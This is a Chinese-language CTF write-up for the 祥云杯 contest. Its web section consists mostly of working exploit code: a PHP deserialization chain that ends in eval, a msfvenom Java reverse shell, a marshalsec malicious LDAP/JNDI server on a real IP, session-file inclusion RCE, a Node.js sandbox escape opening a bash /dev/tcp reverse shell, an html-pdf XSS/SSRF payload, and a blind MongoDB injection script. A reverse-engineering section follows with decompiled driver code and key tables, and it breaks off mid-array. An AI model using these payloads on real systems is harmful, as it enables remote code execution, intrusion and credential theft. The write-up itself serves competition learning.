# 祥云杯

[toc]

## web

### ezyii

网上有现成的exp
```php=
<?php
namespace Codeception\Extension{
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class  RunProcess{
        protected $output;
        private $processes = [];
        public function __construct(){
            $this->processes[]=new DefaultGenerator(new AppendStream());
            $this->output=new DefaultGenerator('jiang');
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker{
    class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this->default = $default;
}
}
}
namespace GuzzleHttp\Psr7{
    use Faker\DefaultGenerator;
    final class AppendStream{
        private $streams = [];
        private $seekable = true;
        public function __construct(){
            $this->streams[]=new CachingStream();
        }
    }
    final class CachingStream{
        private $remoteStream;
        public function __construct(){
            $this->remoteStream=new DefaultGenerator(false);
            $this->stream=new  PumpStream();
        }
    }
    final class PumpStream{
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct(){
            $this->buffer=new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function(){eval($_GET[1]);};
            $a = \Opis\Closure\serialize($a);
            $b = unserialize($a);
            $this->source=$b;
        }
    }
}
```

```http
POST http://???.cloudeci1.ichunqiu.com/?1=system(%27cat%20/flag.txt%27); HTTP/1.1
Host: ???.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1337
Origin: http://???.cloudeci1.ichunqiu.com
Connection: keep-alive
Referer: http://???.cloudeci1.ichunqiu.com/?1=system(%27ls%20/%27);
Cookie: __jsluid_h=09f23c4e81a25c62342d6435202d9e2b
Upgrade-Insecure-Requests: 1

data=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjU6ImppYW5nIjt9czo0MzoiAENvZGVjZXB0aW9uXEV4dGVuc2lvblxSdW5Qcm9jZXNzAHByb2Nlc3NlcyI7YToxOntpOjA7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7TzoyODoiR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbSI6Mjp7czozNzoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac3RyZWFtcyI7YToxOntpOjA7TzoyOToiR3V6emxlSHR0cFxQc3I3XENhY2hpbmdTdHJlYW0iOjI6e3M6NDM6IgBHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbQByZW1vdGVTdHJlYW0iO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO2I6MDt9czo2OiJzdHJlYW0iO086MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjozOntzOjM0OiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac291cmNlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MTgyOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjI3OiJmdW5jdGlvbigpe2V2YWwoJF9HRVRbMV0pO30iO3M6NToic2NvcGUiO3M6MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDQzNTkyMjY2MDAwMDAwMDAwOTRhYTRjNSI7fX1zOjMyOiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac2l6ZSI7aTotMTA7czozNDoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAGJ1ZmZlciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxOiJqIjt9fX19czozODoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac2Vla2FibGUiO2I6MTt9fX19
```

### 层层穿透

Apache Flink rce
用msf生成payload，上传等shell反弹

```shell
msfvenom -p java/meterpreter/reverse_tcp LHOST=ip LPORT=9999 -f jar > /tmp/shell.jar
```

![image-20210822182600172](https://i.loli.net/2021/08/22/Ku9emQCDXtlVBaT.png)

内网测到`10.10.1.11:8080`有服务，用内网穿透工具带出来。


给的附件是内网8080端口的服务，/admin/test接口可以解析Fastjson，但是有shiro的限制，shiro版本不高，/admin/test/可以直接绕过。
Fastjson的waf禁用了unicode和十六进制绕过，Fastjson的版本是24的，没有autotype的限制，并且服务端存在shiro-core和slf4j-api依赖，所以用org.apache.shiro.jndi.JndiObjectFactory尝试JNDI注入：
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_ba2a0510f55bf56f79eefeabbb731166.png)
填充垃圾数据绕过长度20000的限制

VPS开一个恶意的LDAP服务，然后加载恶意的字节码反弹shell：
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://82.156.57.187:9999/#Evil 2333
```

### 安全检测

要扫目录，/admin/include123.php，然后就是包含session getshell
```python
import requests
import re

sessid = 'Qftm'


def READ():
    session = requests.session()
    url = ""
    check2_url = url + "/check2.php"
    preview_url = url + "/preview.php"
    burp0_cookies = {"PHPSESSID": "Qftm"}
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"}
    burp0_data = {
        "url1": f"http://127.0.0.1/admin/include123.php?u=/tmp/sess_{sessid}#<?php system('/getfl?g.sh');?>"}
    session.post(check2_url, headers=burp0_headers,
                 cookies=burp0_cookies, data=burp0_data)
    session.get(url, headers=burp0_headers,
                cookies=burp0_cookies)
    res = session.get(preview_url, headers=burp0_headers,
                      cookies=burp0_cookies)
    print(re.search("flag\{.*?\}", res.text).group())

READ()
```

### crawler_z
看源码，其中一个`zombie`包存在代码注入。想办法可以让他爬自定义页面。

登录注册后`/user/verify`提交参数,bypass检测
```
???.ichunqiu.com:8888/user/verify?token=http://182.92.6.230:8000/%23.oss-cn-beijing.ichunqiu.com
```

将其更改为自己的vps ip

vps上放置如下页面

```html
<html>
<head></head>
<body>
<script>c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c', 'bash -i >& /dev/tcp/ip/port 0>&1']); console.log(ls.output.toString());")()</script>
</body>
<html>
```

`GET`一下`/user/bucket`静候弹shell

### Secrets_Of_Admin
通过代码审计和基础js知识可知xss的过滤可以使用数组绕过，这里结合html-pdf的[CVE-2019-15138](https://nvd.nist.gov/vuln/detail/CVE-2019-15138)去构造个xhr请求后端只允许127.0.0.1的/api/files创建一个admin,a/../flag/123的记录

```content[]=<script>var+ajax+=+new+XMLHttpRequest();ajax.open('GET','http://127.0.0.1:8888/api/files?username=admin&filename=a/../flag&checksum=123');ajax.send();</script>```

然后访问/api/files/123即可

### PackageManager2021
在auth接口处有个js语法的mongodb注入，可以直接注出admin密码，登录就可以拿到flag

```python
import requests

target = 'http://47.104.108.80:8888/auth'
flag = ''
session = ""
csrf_token = ""
burp0_cookies = {"session": session}


# 二分
for i in range(0, 3000):
    min_value = 33
    max_value = 127
    mid_value = (min_value + max_value) // 2
    while min_value < max_value:
        payload = '15f65b0dd2a4ccd5862e588bc7c5d42b" || (this.username == "admin" && this.password.charCodeAt({}) > {}) && "1"=="1'.format(
            str(i), str(mid_value))
        post_payload = '{}'.format(payload)
        s = requests.session()
        res = s.post(url=target, data={
                     "token": post_payload, "_csrf": csrf_token}, cookies=burp0_cookies, allow_redirects=False)
        # print(res.text)
        if res.status_code == 302:
            min_value = mid_value + 1
        else:
            max_value = mid_value

        mid_value = (min_value + max_value) // 2

    if chr(mid_value) == "":
        break
    flag += chr(mid_value)
    print(flag)
```



## reverse
### Rev_APC
sys创建了一个dll, 关闭数字签名可以创建加载sys文件

```
  wcscpy_s(Dst, 0x44ui64, L"\\??\\C:\\WINDOWS\\TEMP\\InjectDLL.dll");
    if ( !sub_140002114(Dst) )
      sub_140002000(Dst, dll_code, Length);
```

 sub_140002000:

```
 sub_140002958(Buffer, Length, key, 4i64);     // 解密dll_code
  RtlInitUnicodeString(&DestinationString, SourceString);
  ObjectAttributes.RootDirectory = 0i64;
  ObjectAttributes.ObjectName = &DestinationString;
  ObjectAttributes.Length = 48;
  ObjectAttributes.Attributes = 576;
  *(_OWORD *)&ObjectAttributes.SecurityDescriptor = 0i64;
  result = ZwCreateFile(&FileHandle, 0x12019Fu, &ObjectAttributes, &IoStatusBlock, 0i64, 2u, 0, 2u, 0x20u, 0i64, 0);
  if ( result >= 0 )
  {
    result = ZwWriteFile(FileHandle, 0i64, 0i64, 0i64, &IoStatusBlock, Buffer, Length, 0i64, 0i64);
```

InjectDLL.dll:

搜索字符串可以找到关键函数

这里面有一个hash算法的加密, 根据前面有一个test的数据, 数据库里面搜了一下, 确定hash算法为sha3_256

这里与sys进行通信

```
DeviceIoControl(v3, 0x220007u, &Buf2, 0x20u, OutBuffer, 32u, &BytesReturned[1], 0i64);
```

```
 sub_7FF90CD71500(0x22000Bu, inBuf1, 0x40u, outBuf1, dwCreationDisposition[0]);
```

每次case都会进行通信

sys的处理函数:

```
 Driver->MajorFunction[14] = (PDRIVER_DISPATCH)sub_140003660;// IRP_MJ_DEVICE_CONTROL
```

```
 case 0x220007u:
        sub_140003704((__int64)pIrp, (__int64)v3);
        break;
      case 0x22000Bu:
        v4 = (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64))sub_1400026E0;
        goto LABEL_15;
      case 0x22000Fu:
        v4 = (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64))sub_140002730;
        goto LABEL_15;
      case 0x220013u:
        v4 = (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64))sub_140002790;
        goto LABEL_15;
      case 0x220017u:
        v4 = (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64))sub_1400027C0;
        goto LABEL_15;
      case 0x22001Bu:
        sub_14000377C(
          (__int64)pIrp,
          (__int64)v3,
          (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64, int))sub_140002820);
        break;
      case 0x22001Fu:
        v4 = (void (__fastcall *)(__int128 *, __int64, __int128 *, __int64))sub_140002900;
LABEL_15:
        sub_140003848((__int64)pIrp, (__int64)v3, v4);
        break;
```

InjectDLL.dll switch执行顺序:

5 5 4 4 5 4 0 0 4 2 5 5 1 3 1 5 1 2 3 0 3 0 2 3 4 4 3 2 2 5 5 0

这里需要手动创建一个加载dll的程序来动态调试这个dll

```
#include<stdio.h>
#include<Windows.h>

int main()
{
	HINSTANCE hDll;
	hDll = LoadLibrary(L"InjectDLL.dll");
}
```
InjectDLL.dll 里面的函数是一个hash算法，利用test数据在跑所有的hash，找到一个匹配的,并计算给定字符串的hash值作为初始key传入驱动
IDA 逆向驱动通信代码如下。
```
   if ( !memcmp(&unk_180005038, Buf2, 32ui64) )
      {
        Buf1_32 = 'LDDarikA';
        v37 = 0;
        memset(Buf2, 0, sizeof(Buf2));
        memset(OutBuffer, 0, sizeof(OutBuffer));
        ((void (__fastcall *)(signed __int64 *, __int64, int *, __int64))GetContentHash_1)(&Buf1_32, 8i64, Buf2, 32i64);
        BytesReturned = 0;
        FileW = CreateFileW(L"\\\\.\\InjectDriver", 0xC0000000, 3u, 0i64, 3u, 0x40000080u, 0i64);
        if ( FileW != (HANDLE)-1i64 )
          DeviceIoControl(FileW, 0x220007u, Buf2, 0x20u, OutBuffer, 0x20u, &BytesReturned, 0i64);
        memset(keydata, 0, sizeof(keydata));
        sub_180001350(OutBuffer, 0x20ui64, 3, keydata);
        v4 = CreateFileW(L"flag.txt", 0x80000000, 1u, 0i64, 3u, 0x80u, 0i64);
        if ( v4 != (HANDLE)-1i64 )
        {
          NumberOfBytesRead = 0;
          v33 = 0;
          memset(flagData, 0, sizeof(flagData));
          v32 = 0i64;
          if ( ReadFile(v4, flagData, 32u, &NumberOfBytesRead, 0i64) )
          {
            CloseHandle(v4);
            v5 = 32i64;
            *(_OWORD *)Buf1 = keydata[1];
            do
            {
              switch ( rand() % 6 )
              {
                case 0:
                  InBuff = malloc(0x40ui64);
                  result = (__int128 *)malloc(0x40ui64);
                  InBuff[4] = 0i64;
                  InBuff[5] = 0i64;
                  InBuff[6] = 0i64;
                  InBuff[7] = 0i64;
                  *result = 0i64;
                  v8 = result;
                  result[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  result[2] = 0i64;
                  result[3] = 0i64;
                  *(_OWORD *)InBuff = keydata[0];
                  *((_OWORD *)InBuff + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)InBuff + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)InBuff + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x22000Bu, InBuff, 0x40u, result, dwCreationDisposition[0]);
                  v9 = v8[1];
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v9;
                  goto LABEL_16;
                case 1:
                  v10 = malloc(0x40ui64);
                  v11 = (__int128 *)malloc(0x40ui64);
                  v10[4] = 0i64;
                  v10[5] = 0i64;
                  v10[6] = 0i64;
                  v10[7] = 0i64;
                  *v11 = 0i64;
                  v8 = v11;
                  v11[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  v11[2] = 0i64;
                  v11[3] = 0i64;
                  *(_OWORD *)v10 = keydata[0];
                  *((_OWORD *)v10 + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)v10 + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)v10 + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x22000Fu, v10, 0x40u, v11, dwCreationDisposition[0]);
                  v12 = v8[1];
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v12;
                  goto LABEL_16;
                case 2:
                  v13 = malloc(0x40ui64);
                  v14 = (__int128 *)malloc(0x40ui64);
                  v13[4] = 0i64;
                  v13[5] = 0i64;
                  v13[6] = 0i64;
                  v13[7] = 0i64;
                  *v14 = 0i64;
                  v8 = v14;
                  v14[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  v14[2] = 0i64;
                  v14[3] = 0i64;
                  *(_OWORD *)v13 = keydata[0];
                  *((_OWORD *)v13 + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)v13 + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)v13 + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x220013u, v13, 0x40u, v14, dwCreationDisposition[0]);
                  v15 = v8[1];
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v15;
                  goto LABEL_16;
                case 3:
                  v16 = malloc(0x40ui64);
                  v17 = (__int128 *)malloc(0x40ui64);
                  v16[4] = 0i64;
                  v16[5] = 0i64;
                  v16[6] = 0i64;
                  v16[7] = 0i64;
                  *v17 = 0i64;
                  v8 = v17;
                  v17[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  v17[2] = 0i64;
                  v17[3] = 0i64;
                  *(_OWORD *)v16 = keydata[0];
                  *((_OWORD *)v16 + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)v16 + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)v16 + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x220017u, v16, 0x40u, v17, dwCreationDisposition[0]);
                  v18 = v8[1];
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v18;
                  goto LABEL_16;
                case 4:
                  v19 = malloc(0x40ui64);
                  v20 = (__int128 *)malloc(0x40ui64);
                  v19[4] = 0i64;
                  v19[5] = 0i64;
                  v19[6] = 0i64;
                  v19[7] = 0i64;
                  *v20 = 0i64;
                  v8 = v20;
                  v20[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  v20[2] = 0i64;
                  v20[3] = 0i64;
                  *(_OWORD *)v19 = keydata[0];
                  *((_OWORD *)v19 + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)v19 + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)v19 + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x22001Bu, v19, 0x40u, v20, dwCreationDisposition[0]);
                  v21 = v8[1];
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v21;
                  goto LABEL_16;
                case 5:
                  v22 = malloc(0x40ui64);
                  v23 = (__int128 *)malloc(0x40ui64);
                  v22[4] = 0i64;
                  v22[5] = 0i64;
                  v22[6] = 0i64;
                  v22[7] = 0i64;
                  *v23 = 0i64;
                  v8 = v23;
                  v23[1] = 0i64;
                  dwCreationDisposition[0] = 64;
                  v23[2] = 0i64;
                  v23[3] = 0i64;
                  *(_OWORD *)v22 = keydata[0];
                  *((_OWORD *)v22 + 1) = *(_OWORD *)Buf1;
                  *((_OWORD *)v22 + 2) = *(_OWORD *)flagData;
                  *((_OWORD *)v22 + 3) = *(_OWORD *)&flagData[4];
                  sub_180001500(0x22001Fu, v22, 0x40u, v23, dwCreationDisposition[0]);
                  keydata[0] = *v8;
                  *(_OWORD *)Buf1 = v8[1];
LABEL_16:
                  *(_OWORD *)flagData = v8[2];
                  *(_OWORD *)&flagData[4] = v8[3];
                  break;
                default:
                  break;
              }
              --v5;
            }
            while ( v5 );
            *(_QWORD *)Buf1 = 0x2F34A83A1B38C557i64;
            *(_QWORD *)&Buf1[2] = 0xEE8F2F04E4C69739ui64;
            *(_QWORD *)&Buf1[4] = 0x486FC9246780515Ei64;
            *(_QWORD *)&Buf1[6] = 0xEBC2C2B0C7BD7F5Bui64;
            if ( !memcmp(Buf1, flagData, 0x20ui64) )
              puts("You Find flag!");
            else
              puts("What a pity! just final step");
          }
        }
```
逆向驱动中的代码
```
    switch ( CurrentStackLocation->Parameters.Read.ByteOffset.LowPart )
    {
      case 0x220007u:
        sub_140002704(a2, CurrentStackLocation);
        break;
      case 0x22000Bu:
        v4 = sub_1400016E0;
        goto LABEL_15;
      case 0x22000Fu:
        v4 = sub_140001730;
        goto LABEL_15;
      case 0x220013u:
        v4 = sub_140001790;
        goto LABEL_15;
      case 0x220017u:
        v4 = sub_1400017C0;
        goto LABEL_15;
      case 0x22001Bu:
        sub_14000277C(a2, CurrentStackLocation, sub_140001820);
        break;
      case 0x22001Fu:
        v4 = sub_140001900;
LABEL_15:
        sub_140002848(a2, CurrentStackLocation, v4);
        break;
    }
```
最终根据驱动中的代码写出脚本

```
#include <iostream>
unsigned char first[32] = {
        0xA5, 0x6A, 0xA7, 0x71, 0xB4, 0x77, 0xC6, 0x03, 0xD1, 0x08, 0xDF, 0x18, 0xCE, 0x03, 0xD7, 0x0F,
        0xCC, 0x77, 0xBA, 0x62, 0xAE, 0x6D, 0xDD, 0x18, 0xC0, 0x09, 0xD5, 0xD5, 0xD5, 0xD5, 0xD5, 0xD5
};
unsigned char sec_key[32][32] = {
        {0x75, 0x3a, 0x77, 0x41, 0x84, 0x47, 0x96, 0x3, 0xa1, 0x8, 0xaf, 0x18, 0x9e, 0x3, 0xa7, 0xf, 0x9c, 0x47, 0x8a, 0x32, 0x7e, 0x3d, 0xad, 0x18, 0x90, 0x9, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, },
        {0x45, 0xea, 0x47, 0xf1, 0x54, 0xf7, 0x66, 0x3, 0x71, 0x8, 0x7f, 0x18, 0x6e, 0x3, 0x77, 0xf, 0x6c, 0xf7, 0x5a, 0xe2, 0x4e, 0xed, 0x7d, 0x18, 0x60, 0x9, 0x75, 0x75, 0x75, 0x75, 0x75, 0x75, },
        {0x45, 0xea, 0x47, 0xf1, 0x54, 0xf7, 0x66, 0x3, 0x71, 0x8, 0x7f, 0x18, 0x6e, 0x3, 0x77, 0xf, 0x6c, 0xf7, 0x5a, 0xe2, 0x4e, 0xed, 0x7d, 0x18, 0x60, 0x9, 0x75, 0x75, 0x75, 0x75, 0x75, 0x75, },
        {0x45, 0xea, 0x47, 0xf1, 0x54, 0xf7, 0x66, 0x3, 0x71, 0x8, 0x7f, 0x18, 0x6e, 0x3, 0x77, 0xf, 0x6c, 0xf7, 0x5a, 0xe2, 0x4e, 0xed, 0x7d, 0x18, 0x60, 0x9, 0x75, 0x75, 0x75, 0x75, 0x75, 0x75, },
        {0xf5, 0xba, 0xf7, 0xc1, 0x24, 0xc7, 0x36, 0x3, 0x41, 0x8, 0x4f, 0x18, 0x3e, 0x3, 0x47, 0xf, 0x3c, 0xc7, 0x2a, 0xb2, 0xfe, 0xbd, 0x4d, 0x18, 0x30, 0x9, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, },
        {0xf5, 0xba, 0xf7, 0xc1, 0x24, 0xc7, 0x36, 0x3, 0x41, 0x8, 0x4f, 0x18, 0x3e, 0x3, 0x47, 0xf, 0x3c, 0xc7, 0x2a, 0xb2, 0xfe, 0xbd, 0x4d, 0x18, 0x30, 0x9, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, },
        {0x5, 0xca, 0x7, 0xd1, 0x34, 0xd7, 0x46, 0x13, 0x51, 0x18, 0x5f, 0x28, 0x4e, 0x13, 0x57, 0x1f, 0x4c, 0xd7, 0x3a, 0xc2, 0xe, 0xcd, 0x5d, 0x28, 0x40, 0x19, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, },
        {0x15, 0xda, 0x17, 0xe1, 0x44, 0xe7, 0x56, 0x23, 0x61, 0x28, 0x6f, 0x38, 0x5e, 0x23, 0x67, 0x2f, 0x5c, 0xe7, 0x4a, 0xd2, 0x1e, 0xdd, 0x6d, 0x38, 0x50, 0x29, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, },
        {0x15, 0xda, 0x17, 0xe1, 0x44, 0xe7, 0x56, 0x23, 0x61, 0x28, 0x6f, 0x38, 0x5e, 0x23, 0x67, 0x2f, 0x5c, 0xe7, 0x4a, 0xd2, 0x1e, 0xdd, 0x6d, 0x38, 0x50, 0x29, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, },
        {0x15, 0xda, 0x17, 0xe1, 0x44, 0xe7, 0x56, 0x23, 0x61, 0x28, 0x6f, 0x38, 0x5e, 0x23, 0x67, 0x2f, 0x5c, 0xe7, 0x4a, 0xd2, 0x1e, 0xdd, 0x6d, 0x38, 0x50, 0x29, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, },
        {0x15, 0xaa, 0x17, 0xb1, 0xf4, 0xb7, 0x26, 0xd3, 0x31, 0xd8, 0x3f, 0xe8, 0x2e, 0xd3, 0x37, 0xdf, 0x2c, 0xb7, 0xfa, 0xa2, 0x1e, 0xad, 0x3d, 0xe8, 0x50, 0xd9, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, },
        {0x15, 0x7a, 0x17, 0x81, 0xc4, 0x87, 0xd6, 0xa3, 0xe1, 0xa8, 0xef, 0xb8, 0xde, 0xa3, 0xe7, 0xaf, 0xdc, 0x87, 0xca, 0x72, 0x1e, 0x7d, 0xed, 0xb8, 0x50, 0xa9, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, },
        {0xc5, 0x2a, 0xc7, 0x31, 0x74, 0x37, 0x86, 0x53, 0x91, 0x58, 0x9f, 0x68, 0x8e, 0x53, 0x97, 0x5f, 0x8c, 0x37, 0x7a, 0x22, 0xce, 0x2d, 0x9d, 0x68, 0x0, 0x59, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, },
        {0x75, 0xda, 0x77, 0xe1, 0x24, 0xe7, 0x36, 0x3, 0x41, 0x8, 0x4f, 0x18, 0x3e, 0x3, 0x47, 0xf, 0x3c, 0xe7, 0x2a, 0xd2, 0x7e, 0xdd, 0x4d, 0x18, 0xb0, 0x9, 0x45, 0x45, 0x45, 0x45, 0x45, 0x45, },
        {0x25, 0x8a, 0x27, 0x91, 0xd4, 0x97, 0xe6, 0xb3, 0xf1, 0xb8, 0xff, 0xc8, 0xee, 0xb3, 0xf7, 0xbf, 0xec, 0x97, 0xda, 0x82, 0x2e, 0x8d, 0xfd, 0xc8, 0x60, 0xb9, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, },
        {0xd5, 0x5a, 0xd7, 0x61, 0xa4, 0x67, 0xb6, 0x83, 0xc1, 0x88, 0xcf, 0x98, 0xbe, 0x83, 0xc7, 0x8f, 0xbc, 0x67, 0xaa, 0x52, 0xde, 0x5d, 0xcd, 0x98, 0x30, 0x89, 0xc5, 0xc5, 0xc5, 0xc5, 0xc5, 0xc5, },
        {0x85, 0xa, 0x87, 0x11, 0x54, 0x17, 0x66, 0x33, 0x71, 0x38, 0x7f, 0x48, 0x6e, 0x33, 0x77, 0x3f, 0x6c, 0x17, 0x5a, 0x2, 0x8e, 0xd, 0x7d, 0x48, 0xe0, 0x39, 0x75, 0x75, 0x75, 0x75, 0x75, 0x75, },
        {0x85, 0xa, 0x87, 0x11, 0x54, 0x17, 0x66, 0x33, 0x71, 0x38, 0x7f, 0x48, 0x6e, 0x33, 0x77, 0x3f, 0x6c, 0x17, 0x5a, 0x2, 0x8e, 0xd, 0x7d, 0x48, 0xe0, 0x39, 0x75, 0x75, 0x75, 0x75, 0x75, 0x75, },
        {0x35, 0xba, 0x37, 0xc1, 0x4, 0xc7, 0x16, 0xe3, 0x21, 0xe8, 0x2f, 0xf8, 0x1e, 0xe3, 0x27, 0xef, 0x1c, 0xc7, 0xa, 0xb2, 0x3e, 0xbd, 0x2d, 0xf8, 0x90, 0xe9, 0x25, 0x25, 0x25, 0x25, 0x25, 0x25, },
        {0x45, 0xca, 0x47, 0xd1, 0x14, 0xd7, 0x26, 0xf3, 0x31, 0xf8, 0x3f, 0x8, 0x2e, 0xf3, 0x37, 0xff, 0x2c, 0xd7, 0x1a, 0xc2, 0x4e, 0xcd, 0x3d, 0x8, 0xa0, 0xf9, 0x35, 0x35, 0x35, 0x35, 0x35, 0x35, },
        {0xf5, 0x7a, 0xf7, 0x81, 0xc4, 0x87, 0xd6, 0xa3, 0xe1, 0xa8, 0xef, 0xb8, 0xde, 0xa3, 0xe7, 0xaf, 0xdc, 0x87, 0xca, 0x72, 0xfe, 0x7d, 0xed, 0xb8, 0x50, 0xa9, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, 0xe5, },
        {0x5, 0x8a, 0x7, 0x91, 0xd4, 0x97, 0xe6, 0xb3, 0xf1, 0xb8, 0xff, 0xc8, 0xee, 0xb3, 0xf7, 0xbf, 0xec, 0x97, 0xda, 0x82, 0xe, 0x8d, 0xfd, 0xc8, 0x60, 0xb9, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, },
        {0x5, 0x8a, 0x7, 0x91, 0xd4, 0x97, 0xe6, 0xb3, 0xf1, 0xb8, 0xff, 0xc8, 0xee, 0xb3, 0xf7, 0xbf, 0xec, 0x97, 0xda, 0x82, 0xe, 0x8d, 0xfd, 0xc8, 0x60, 0xb9, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, 0xf5, },
        {0xb5, 0x3a, 0xb7, 0x41, 0x84, 0x47, 0x96, 0x63, 0xa1, 0x68, 0xaf, 0x78, 0x9e, 0x63, 0xa7, 0x6f, 0x9c, 0x47, 0x8a, 0x32, 0xbe, 0x3d, 0xad, 0x78, 0x10, 0x69, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, },
        {0xb5, 0x3a, 0xb7, 0x41, 0x84, 0x47, 0x96, 0x63, 0xa1, 0x68, 0xaf, 0x78, 0x9e, 0x63, 0xa7, 0x6f, 0x9c, 0x47, 0x8a, 0x32, 0xbe, 0x3d, 0xad, 0x78, 0x10, 0x69, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, },
        {0xb5, 0x3a, 0xb7, 0x41, 0x84, 0x47, 0x96, 0x63, 0xa1, 0x68, 0xaf, 0x78, 0x9e, 0x63, 0xa7, 0x6f, 0x9c, 0x47, 0x8a, 0x32, 0xbe, 0x3d, 0xad, 0x78, 0x10, 0x69, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, 0xa5, },
        {0x65, 0xea, 0x67, 0xf1, 0x34, 0xf7, 0x46, 0x13, 0x51, 0x18, 0x5f, 0x28, 0x4e, 0x13, 0x57, 0x1f, 0x4c, 0xf7, 0x3a, 0xe2, 0x6e, 0xed, 0x5d, 0x28, 0xc0, 0x19, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, },
        {0x65, 0xea, 0x67, 0xf1, 0x34, 0xf7, 0x46, 0x13, 0x51, 0x18, 0x5f, 0x28, 0x4e, 0x13, 0x57, 0x1f, 0x4c, 0xf7, 0x3a, 0xe2, 0x6e, 0xed, 0x5d, 0x28, 0xc0, 0x19, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, },
        {0x65, 0xea, 0x67, 0xf1, 0x34, 0xf7, 0x46, 0x13, 0x51, 0x18, 0x5f, 0x28, 0x4e, 0x13, 0x57, 0x1f, 0x4c, 0xf7, 0x3a, 0xe2, 0x6e, 0xed, 0x5d, 0x28, 0xc0, 0x19, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, },
